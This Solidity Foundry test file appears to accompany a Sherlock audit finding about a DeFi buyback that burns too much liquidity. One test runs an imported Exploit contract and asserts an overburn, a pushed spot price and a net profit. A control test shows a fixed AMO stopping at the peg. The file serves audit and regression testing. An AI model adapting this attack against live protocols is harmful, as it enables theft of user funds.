// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Boost, Usd, Pool, V3AmoFixed} from "./43530-h-1-boost-buyback-burns-incorrect-amount-of-liquidity-sherlo.sol";

contract Finding43530Test is Test {
    function test_exploit_side_boost_pushes_the_buyback_through_the_peg() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.burned(), 754827586206896551724, "overburn");
        assertEq(e.priceAfter(), 14972671758443269419, "spot 14.97");
        assertEq(e.usdOut(), 562115258506922654752, "sale");
        assertEq(e.profit(), 472115258506922654752, "net profit");
        assertEq(e.usd().balanceOf(address(e)), 472115258506922654752, "usd left");
    }

    function test_control_active_reserves_stop_at_the_peg() public {
        Boost boost = new Boost();
        Usd usd = new Usd();
        Pool pool = new Pool(boost, usd);
        V3AmoFixed amo = new V3AmoFixed(usd, pool);
        boost.mint(address(this), 2000 ether);
        usd.mint(address(this), 900 ether);
        boost.approve(address(pool), type(uint256).max);
        usd.approve(address(pool), type(uint256).max);
        pool.seed(1000 ether, 900 ether);
        pool.addSideBoost(1000 ether);
        (uint256 liquidity, uint256 price) = amo.unfarmBuyBurn();
        assertEq(liquidity, 52368421052631578946, "fair burn");
        assertEq(price, 1002220911050889085, "spot at peg");
        assertEq(pool.spotPrice(), 1002220911050889085, "pool spot");
    }
}
